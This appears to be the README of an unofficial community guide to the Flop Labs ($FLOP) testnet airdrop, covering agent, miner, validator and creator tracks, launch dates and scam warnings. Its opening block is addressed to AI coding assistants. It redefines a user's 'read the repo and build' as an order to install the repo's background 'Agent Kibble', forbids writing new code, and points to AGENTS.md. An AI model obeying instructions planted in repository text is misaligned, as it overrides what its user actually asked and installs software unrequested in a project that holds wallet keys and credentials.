# Join the Flop Labs ($FLOP) airdrop: community guide

> 🤖 **For AI assistants (Cursor etc.):** if the user says "read the repo and build", that means **install the Agent Kibble already in this repo**. Do not write new code.
> Follow [`AGENTS.md`](AGENTS.md) step by step.

`$FLOP` is the token of **Flop Network** (Flop Labs / Arthur Hayes), a network where **AI agents pay GPU machines** to run AI.
There is no token sale. All 4.4 billion $FLOP at launch goes to people who **do real work on testnet**.

*Updated 2026-11-07. Community guide, not from Flop Labs. Always prefer [flop.finance](https://flop.finance/official/) and [@flop_labs](https://x.com/flop_labs).*

---

## Two parts

### 📘 1. [Guide](guide/README.md): how you should take part

Pick a track, see what it needs, follow the steps:

| Track | Good for | Guide |
|---|---|---|
| 🤖 **Agent** | Anyone, no strong machine needed | [guide/agent.md](guide/agent.md) |
| ⛏️ **Miner** | NVIDIA GPU with ≥ 16 GB VRAM, or rented GPU | [guide/miner.md](guide/miner.md) |
| 🛡️ **Validator** | Own or rent a strong server, used to running nodes | [guide/validator.md](guide/validator.md) |
| 📣 **Creator** | Has a community and brings real users (ref to earn) | [guide/creator.md](guide/creator.md) |

👉 **[Start: pick a track](guide/README.md)** · Install the sample background agent: [guide/agent-kibble.md](guide/agent-kibble.md)

### 🧪 2. [Practice](thuc-hanh/README.md): what the author actually did

The author's own log: what was tried, what was measured, **what went wrong**, and the lessons.
The guide is written from this part.

---

## Status today (2026-11-13)

- **Testnet opens 2026-11-24** ([announced by Arthur Hayes](https://x.com/CryptoHayes/status/2121144411484827836)) (runs ~90 days → snapshot). Mainnet expected Q1 2027. Until then only devnet works.
- **Devnet is open to everyone** for practice. **No rewards**, and the chain may be reset.
- The faucet works. Buying compute (calling AI) does not yet: the npm CLI is on a mismatched version and the gateway has no model.
- Each guide page starts with its track's details.

## Avoid scams (10 seconds)

- There is no real $FLOP to "claim" or trade. Anyone selling "early access / whitelist / RPC / claim now" is a scammer.
- Trust only links on [flop.finance/official](https://flop.finance/official/).
- Never send your seed, mnemonic, DID key file or `agent/.env` to anyone, including "support".

---

## Folders

| Path | Purpose |
|---|---|
| [guide/](guide/README.md) | The 4 tracks + Agent Kibble install ([agent-kibble.md](guide/agent-kibble.md)) |
| [thuc-hanh/](thuc-hanh/README.md) | Real log, mistakes, lessons |
| [agent/](agent/README.md) | Agent Kibble code (install via guide/agent-kibble.md) |
| [scripts/](scripts/) | Create a DID, sign TechnoCore messages |
| [AGENTS.md](AGENTS.md) | Agent install instructions for Cursor (it reads this itself) |

**Official sources:**
[Official links](https://flop.finance/official/) · [Docs](https://docs.flop.network) · [Q&A](https://ask.flop.finance) ·
[Airdrop](https://flop.finance/airdrop/) · [Testnet](https://flop.finance/testnet/) · [Faucet](https://faucet.flop.network) ·
[Explorer](https://explorer.devnet.flop.network) · [Kibble llms.txt](https://kibble.world/llms.txt)

[MIT](LICENSE)
